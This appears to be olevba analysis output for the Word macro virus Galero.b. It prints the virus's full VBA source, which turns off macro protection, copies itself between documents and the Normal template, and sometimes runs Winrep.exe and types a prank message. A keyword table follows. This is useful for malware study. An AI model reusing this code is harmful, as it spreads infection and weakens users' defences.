olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Galero.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Galero.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO payasada.bas 
in file: ./Virus.MSWord.Galero.b - OLE stream: 'Macros/VBA/payasada'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'
' AutoOpen Macro
' Payasada!!!


On Error GoTo payasada

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    'Set ActiveDoc = ActiveDocument
    'Set GlobalDoc = NormalTemplate


If Not DocInfectado() Then
    Docinf
End If

If Not NormalInfectado() Then
    Norinf
End If

Call Trues

payasada:
End Sub
Private Sub Docinf()
On Error GoTo InfecDocError
    
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, Name:="payasada", _
    Object:=wdOrganizerObjectProjectItems

InfecDocError:
End Sub
Private Sub Norinf()
On Error GoTo InfecDocError

    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, Name:="payasada", _
    Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = True

InfecDocError:
End Sub
Public Function DocInfectado()
On Error GoTo DocInfectError
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "payasada" Then
            DocInfectado = True
        End If
Next

DocInfectError:
End Function

Public Function NormalInfectado()

On Error GoTo NormalInfectError
For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "payasada" Then
            NormalInfectado = True
        End If
Next


NormalInfectError:
End Function

Sub Trues()
If Second(Now) = Minute(Now) Then Call Payasadas
    

End Sub

Sub Payasadas()
On Error Resume Next
Options.BlueScreen = True
MyApp = Shell("Winrep.exe", 1)
SendKeys "Hola, creo que me han infectado de nuevo.  YA ME TIENEN HARTO!!!    ATT, El sistema", True


End Sub


Sub AutoClose()
On Error Resume Next
Call Trues

End Sub



Sub ToolsOptions()
On Error Resume Next
Options.VirusProtection = 1
Options.SaveNormalPrompt = 1
Dialogs(wdDialogToolsOptions).Show
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Winrep.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

